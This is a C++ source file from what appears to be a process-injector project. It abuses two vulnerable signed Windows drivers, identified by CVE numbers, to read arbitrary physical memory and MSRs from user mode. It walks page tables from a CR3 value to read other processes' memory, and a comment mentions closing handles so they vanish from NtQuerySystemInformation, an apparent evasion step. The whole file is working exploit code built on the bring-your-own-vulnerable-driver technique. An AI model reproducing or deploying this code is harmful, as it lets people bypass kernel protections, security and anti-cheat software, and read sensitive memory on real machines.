/*
 * starlight-sys :: injector/src/physmem.cpp
 *
 * READ-ONLY physical memory access via pluggable driver backends.
 *
 * Supported backends:
 *   LnvMSRIO.sys   (CVE-2025-8061) - 4KB chunks, MSR support
 *   ThrottleStop.sys (CVE-2025-7771) - 8B chunks, no MSR
 *
 * SAFETY:
 *   PA range filter prevents reads outside known RAM ranges.
 *   The filter catches bad addresses BEFORE the IOCTL is sent.
 *
 * NO WRITE IOCTLs. Write codes are not compiled into this binary.
 */

#include "physmem.h"
#include <cstdio>
#include <cstring>
#include <algorithm>

/* ------------------------------------------------------------------ */
/*  Constructor / Destructor                                           */
/* ------------------------------------------------------------------ */

PhysicalMemory::PhysicalMemory(IDriverBackend* backend)
    : m_hDevice(INVALID_HANDLE_VALUE)
    , m_backend(backend)
    , m_hasSafeRanges(false)
{
    if (!m_backend)
        m_backend = &m_defaultBackend;
}

PhysicalMemory::~PhysicalMemory()
{
    Close();  /* safety net */
}

/* ------------------------------------------------------------------ */
/*  PA Safety Filter                                                   */
/*                                                                     */
/*  Checks every physical address against known RAM ranges before      */
/*  sending the IOCTL to the driver. If the address is NOT within      */
/*  a safe range, the read is rejected (buffer zeroed, returns false). */
/*  This prevents BSODs caused by MmMapIoSpace returning NULL for      */
/*  MMIO, hypervisor-reserved, or otherwise unmappable regions.        */
/* ------------------------------------------------------------------ */

void PhysicalMemory::SetSafeRanges(const std::vector<MemRange>& ranges)
{
    m_safeRanges = ranges;
    m_hasSafeRanges = !ranges.empty();
}

void PhysicalMemory::ClearSafeRanges()
{
    m_safeRanges.clear();
    m_hasSafeRanges = false;
}

bool PhysicalMemory::IsAddressSafe(uint64_t pa, size_t size) const
{
    if (!m_hasSafeRanges)
        return true;  /* no filter configured - allow all */

    uint64_t end = pa + size;

    for (const auto& r : m_safeRanges) {
        if (pa >= r.start && end <= r.end)
            return true;
    }
    return false;
}

/* ------------------------------------------------------------------ */
/*  Open - Acquire handle to \\.\WinMsrDev                            */
/*  Keep this call paired with Close() via Session RAII.               */
/* ------------------------------------------------------------------ */

bool PhysicalMemory::Open()
{
    if (m_hDevice != INVALID_HANDLE_VALUE)
        return true;  /* already open */

    /*
     * Open the device exposed by the active backend.
     * Use GENERIC_READ | GENERIC_WRITE - both PoCs require this.
     */
    m_hDevice = CreateFileA(
        m_backend->DevicePathA(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (m_hDevice == INVALID_HANDLE_VALUE)
        return false;

    return true;
}

/* ------------------------------------------------------------------ */
/*  Close - Release handle immediately                                 */
/*  After this, the handle disappears from NtQuerySystemInformation.   */
/* ------------------------------------------------------------------ */

void PhysicalMemory::Close()
{
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
}

/* ------------------------------------------------------------------ */
/*  Physical Memory Read                                               */
/*  IOCTL 0x9c406104                                                   */
/* ------------------------------------------------------------------ */

bool PhysicalMemory::ReadPhysical(uint64_t physAddr, void* buffer, size_t size)
{
    static bool s_ioctlWarnShown = false;

    if (m_hDevice == INVALID_HANDLE_VALUE || !buffer || size == 0)
        return false;

    uint8_t* out = static_cast<uint8_t*>(buffer);
    size_t remaining = size;
    uint64_t pa = physAddr;
    size_t failedChunks = 0;

    /* Chunk size from the active backend (4KB for LnvMSRIO, 8B for TS) */
    const size_t maxChunk = m_backend->MaxReadChunk();

    while (remaining > 0) {
        size_t chunk = (std::min)(remaining, maxChunk);

        /*
         * PA SAFETY CHECK (per chunk).
         * Reject addresses outside known RAM ranges before IOCTL.
         */
        if (m_hasSafeRanges && !IsAddressSafe(pa, chunk)) {
            memset(out, 0, chunk);
            out       += chunk;
            pa        += chunk;
            remaining -= chunk;
            continue;
        }

        /* Delegate to backend (handles IOCTL format differences) */
        if (!m_backend->ReadPhysicalChunk(m_hDevice, pa, out, chunk)) {
            memset(out, 0, chunk);
            failedChunks++;
        }

        out       += chunk;
        pa        += chunk;
        remaining -= chunk;
    }

    /* Warn once if all chunks failed (probable IOCTL issue) */
    if (failedChunks > 0 && !s_ioctlWarnShown) {
        size_t totalChunks = (size + m_backend->MaxReadChunk() - 1) /
                             m_backend->MaxReadChunk();
        if (failedChunks == totalChunks) {
            printf("[!] ReadPhysical: ALL %zu chunks failed for PA 0x%llX "
                   "(IOCTL not working)\n",
                   totalChunks, physAddr);
            fflush(stdout);
            s_ioctlWarnShown = true;
        }
    }

    return (failedChunks == 0);
}

/* ------------------------------------------------------------------ */
/*  MSR Read                                                           */
/*  IOCTL 0x9c402084                                                   */
/* ------------------------------------------------------------------ */

uint64_t PhysicalMemory::ReadMSR(uint32_t reg)
{
    if (m_hDevice == INVALID_HANDLE_VALUE)
        return 0;

    if (!m_backend->SupportsMSR())
        return 0;

    return m_backend->ReadMSR(m_hDevice, reg);
}

/* ------------------------------------------------------------------ */
/*  Virtual-to-Physical Translation (4-Level Page Table Walk)          */
/* ------------------------------------------------------------------ */

uint64_t PhysicalMemory::VirtToPhys(uint64_t cr3, uint64_t va)
{
    /* PML4 */
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pml4e_pa = (cr3 & PTE_FRAME_MASK) + pml4_idx * 8;
    uint64_t pml4e    = ReadPhys<uint64_t>(pml4e_pa);
    if (!(pml4e & PTE_PRESENT_BIT))
        return 0;

    /* PDPT */
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pdpte_pa = (pml4e & PTE_FRAME_MASK) + pdpt_idx * 8;
    uint64_t pdpte    = ReadPhys<uint64_t>(pdpte_pa);
    if (!(pdpte & PTE_PRESENT_BIT))
        return 0;
    if (pdpte & PTE_LARGE_PAGE_BIT)
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);

    /* PD */
    uint64_t pd_idx  = (va >> 21) & 0x1FF;
    uint64_t pde_pa  = (pdpte & PTE_FRAME_MASK) + pd_idx * 8;
    uint64_t pde     = ReadPhys<uint64_t>(pde_pa);
    if (!(pde & PTE_PRESENT_BIT))
        return 0;
    if (pde & PTE_LARGE_PAGE_BIT)
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);

    /* PT */
    uint64_t pt_idx  = (va >> 12) & 0x1FF;
    uint64_t pte_pa  = (pde & PTE_FRAME_MASK) + pt_idx * 8;
    uint64_t pte     = ReadPhys<uint64_t>(pte_pa);
    if (!(pte & PTE_PRESENT_BIT))
        return 0;

    return (pte & PTE_FRAME_MASK) | (va & 0xFFFULL);
}

/* ------------------------------------------------------------------ */
/*  Virtual Memory Read (handles page boundaries)                      */
/* ------------------------------------------------------------------ */

bool PhysicalMemory::ReadVirtual(uint64_t cr3, uint64_t va,
                                  void* buffer, size_t size)
{
    uint8_t* out = static_cast<uint8_t*>(buffer);
    size_t remaining = size;
    uint64_t cur_va = va;

    while (remaining > 0) {
        size_t pageOff = cur_va & 0xFFF;
        size_t chunk   = (std::min)(remaining, static_cast<size_t>(0x1000 - pageOff));

        uint64_t pa = VirtToPhys(cr3, cur_va);
        if (pa == 0) {
            memset(out, 0, chunk);
        } else {
            if (!ReadPhysical(pa, out, chunk))
                memset(out, 0, chunk);
        }

        out       += chunk;
        cur_va    += chunk;
        remaining -= chunk;
    }
    return true;
}
